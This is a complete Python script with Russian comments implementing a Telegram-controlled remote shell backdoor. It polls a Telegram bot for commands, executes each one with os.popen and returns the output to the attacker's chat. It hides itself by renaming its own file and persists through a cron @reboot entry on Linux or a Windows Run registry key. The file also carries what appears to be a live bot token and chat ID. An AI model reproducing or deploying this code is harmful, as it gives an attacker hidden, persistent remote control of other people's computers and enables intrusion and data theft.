import os
import requests
import time
import sys

# ===== НАСТРОЙКИ ===== #
TOKEN = "7515351481:AAHOGEuhJuBb2gE7aQa5sFwvrhkKIPvZTYQ"  # Получить у @BotFather
CHAT_ID = "5405936031"       # Узнать через /getUpdates
DELAY = 5  # Задержка между проверками команд (секунды)
# ===================== #

def send_message(text: str):
    """Отправка сообщения в Telegram"""
    requests.post(
        f"https://api.telegram.org/bot{TOKEN}/sendMessage",
        json={"chat_id": CHAT_ID, "text": text}
    )

def get_commands():
    """Получение новых команд от бота"""
    try:
        updates = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates").json()
        return updates.get("result", [])
    except Exception as e:
        print(f"Ошибка при получении команд: {e}")
        return []

def execute_command(cmd: str) -> str:
    """Выполнение команды в системе"""
    try:
        result = os.popen(cmd).read()
        return result if result else "[OK] Команда выполнена (вывод пуст)"
    except Exception as e:
        return f"[ERROR] {str(e)}"

def hide_process():
    """Скрытие процесса в системе"""
    if os.name == 'posix':  # Для Linux
        script_name = sys.argv[0]
        if not script_name.startswith('.'):
            os.rename(script_name, f".{script_name}")
    # Для Windows можно добавить другие методы скрытия

def setup_autostart():
    """Добавление в автозагрузку"""
    if os.name == 'posix':  # Для Linux (через cron)
        cron_cmd = f"@reboot cd {os.getcwd()} && python3 {__file__} &"
        os.system(f"(crontab -l 2>/dev/null; echo '{cron_cmd}') | crontab -")
    elif os.name == 'nt':   # Для Windows (через реестр)
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "TelegramRemoteShell", 0, winreg.REG_SZ, sys.executable + " " + __file__)
        key.Close()

def main():
    hide_process()
    setup_autostart()
    send_message("🤖 Удалённый shell активирован. Отправьте команду.")
    
    last_update_id = 0
    while True:
        updates = get_commands()
        for update in updates:
            if update["update_id"] > last_update_id:
                last_update_id = update["update_id"]
                cmd = update["message"]["text"].strip()
                
                if cmd == "/exit":
                    send_message("Сеанс завершён.")
                    return
                
                output = execute_command(cmd)
                send_message(output)
        
        time.sleep(DELAY)

if __name__ == "__main__":
    main()